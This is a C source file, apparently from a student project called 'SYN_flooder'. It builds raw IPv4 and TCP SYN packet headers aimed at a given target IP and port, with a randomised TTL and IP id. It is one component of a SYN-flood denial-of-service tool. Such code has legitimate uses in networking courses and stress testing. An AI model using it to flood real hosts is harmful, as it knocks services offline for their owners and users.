/*
** packet.c for packet in /home/janel/Projects/templates/network/SYN_flooder
**
** Made by Janel
** Login   <janel@epitech.net>
**
** Started on  Mon May 29 16:18:58 2017 Janel
** Last update Mon Oct 23 00:27:22 2017 
*/

#include <stdlib.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include "syn_flooder.h"
#include "debug.h"

/*
** Only setting fields which are NOT 0.
** This area has already been memset (in main)
*/
static char		build_ip_header(unsigned char *packet,
					const char *target_ip_address)
{
  struct iphdr		*ip_header;
  struct in_addr	temp;

  INSIDE;
  ip_header = (struct iphdr *)packet;
  ip_header->ihl = 5;
  ip_header->version = 4;
  ip_header->ttl = RANDOM_NBR_RANGE(64, 255);
  ip_header->protocol = IPPROTO_TCP;
  ip_header->id = htons(RANDOM_NBR_RANGE(0, 0xFFFF));
  ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
  if (inet_aton(target_ip_address, &temp) != 1)
    return (PRINT_ERROR("inet_aton:"), FALSE);
  ip_header->daddr = temp.s_addr;
  return (TRUE);
}

/*
** Only setting fields which are NOT 0.
** This area has already been memset (in main)
*/
static char	build_tcp_header(unsigned char *packet, const int port)
{
  struct tcphdr	*tcp_header;

  tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
  tcp_header->dest = htons(port);
  tcp_header->doff = 5;
  tcp_header->syn = 1;
  return (TRUE);
}

char		build_packet(unsigned char *packet,
			     const char *target_ip_address,
			     const int port)
{
  return (build_ip_header(packet, target_ip_address)
	  && build_tcp_header(packet, port));
}
